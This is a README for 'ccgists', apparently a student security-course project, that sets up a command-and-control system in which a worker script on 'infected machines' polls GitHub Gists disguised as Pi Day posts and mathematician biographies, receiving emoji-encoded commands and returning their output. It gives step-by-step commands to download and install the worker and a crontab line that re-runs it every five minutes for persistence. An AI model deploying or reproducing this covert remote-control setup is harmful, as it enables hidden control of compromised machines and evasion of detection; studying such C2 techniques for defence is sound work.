<a name="readme-top"></a>

[![Stargazers][stars-shield]][stars-url]
[![MIT License][license-shield]][license-url]
[![LinkedIn][linkedin-shield]][linkedin-url]

<!-- PROJECT LOGO -->
<br />
<div align="center">
  <a href="https://github.com/andrsdt/ccgists">
    <img src="https://i.imgur.com/ZoJzgg1.png" alt="Logo" width="" height="80">
  </a>

</div>

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#about-the-project">About The Project</a>
    </li>
    <li>
      <a href="#getting-started">Getting Started</a>
      <ul>
        <li><a href="#installation">Installation</a></li>
      </ul>
    </li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
  </ol>
</details>

<!-- ABOUT THE PROJECT -->

## About The Project

This repository contains the code for the **ccgists** project, which is composed of two independent projects:

- `controller`: a Python script that allows for centralized management of the C2 infrastructure. It allows the attacker to see the list of available agents, send commands to them and read the output of the commands.
- `worker`: a Python script that runs periodically on the infected machine and communicates with the controller to inform about its state. In case of pending commands, it executes them and sends the output back to the controller.

The communication is done entirely through GitHub Gists. There is a gist disguised as **a celebration for the Pi Day**, where infected computers will post their status. When the attacker sends a command to an infected machine, it creates a gist disguised as **a mathematician's biography** that will be used as a thread for that communication. Commands and outputs with that machine will be encoded as emojis.

<!-- GETTING STARTED -->

## Getting Started

We will first set up the infected machines, and then the controller.

For both machines, we will use a GitHub personal access token to authenticate the requests. This token will be used to do operations with gists, which will be the only communication channel between the infected machines and the controller. A token for my account can be found in the report in Google Docs for the subject, but note that it will create private gists on my account that won't be visible from the professor's account. It's better to provide your own token, you can create one in the [GitHub settings](https://github.com/settings/tokens?type=beta). Only the scope for managing gists is required.

### Installation

#### Infected machines

1. Download and unzip the latest release from the [releases page](https://github.com/andrsdt/ccgists/releases)

```sh
wget -q https://github.com/andrsdt/ccgists/releases/download/v1.0.0/worker.tar.gz
mkdir ~/.worker; tar -xf worker.tar.gz -C ~/.worker; rm worker.tar.gz
cd .worker
```

2. Create a virtual environment

```sh
python3 -m venv .venv
source .venv/bin/activate
```

3. Install the dependencies

```sh
pip install -r requirements.txt
```

4. Create the `.env` file with the GitHub Token

```sh
echo "GITHUB_TOKEN=<secret_token>" > .env
```

5. Run the worker

```sh
python3 ./dist/main.py
```

The script can be run with `python3 ./worker/dist/main.py` and it will do its routine tasks when executed. It can be scheduled to run periodically (for example, every 5 minutes) with `crontab` by running the following bash command:

```sh
crontab -l | { cat; echo "*/5 * * * * $HOME/.worker/.venv/bin/python3 $HOME/.worker/dist/main.py"; } | crontab -
```

#### Controller

The controller's entry point is a Python script in `controller/src/main.py`. The setup is similar to the script for infected machines:

1. Download and unzip the latest release from the [releases page](https://github.com/andrsdt/ccgists/releases)

```sh
wget https://github.com/andrsdt/ccgists/releases/download/v1.0.0/controller.tar.gz
mkdir ccgists; tar -xf controller.tar.gz -C ccgists
cd ccgists
```

2. Create a virtual environment

```sh
python3 -m venv .venv
source .venv/bin/activate
```

3. Install the dependencies

```sh
pip install -r requirements.txt
```

4. Create the `.env` file with the GitHub Token

```sh
echo "GITHUB_TOKEN=<secret_token>" > .env
```

5. Run the controller

```sh
python3 ./src/main.py
```

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- USAGE EXAMPLES -->

## Usage

The script is intuitive to use, and it will show a menu with the available options. The menu will show the available agents, and the user can select one of them to send commands to it. These will be processed as soon as the infected machine runs the script again.

![](https://i.imgur.com/JSsuHea.gif)

_For any doubt in the usage, do not hesitate to contact me_

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- LICENSE -->

## License

Distributed under the MIT License. See `LICENSE.txt` for more information.

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- CONTACT -->

## Contact

Andrés Durán - [@andresdt](https://twitter.com/andresdt) - [andrez#0077](https://discord.com) - duranand@fit.cvut.cz

Project Link: [https://github.com/andrsdt/ccgists](https://github.com/andrsdt/ccgists)

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->

[stars-shield]: https://img.shields.io/github/stars/othneildrew/Best-README-Template.svg?style=for-the-badge
[stars-url]: https://github.com/andrsdt/ccgists/stargazers
[license-shield]: https://img.shields.io/github/license/othneildrew/Best-README-Template.svg?style=for-the-badge
[license-url]: https://github.com/andrsdt/ccgists/blob/master/LICENSE.txt
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
[linkedin-url]: https://linkedin.com/in/andrsdt
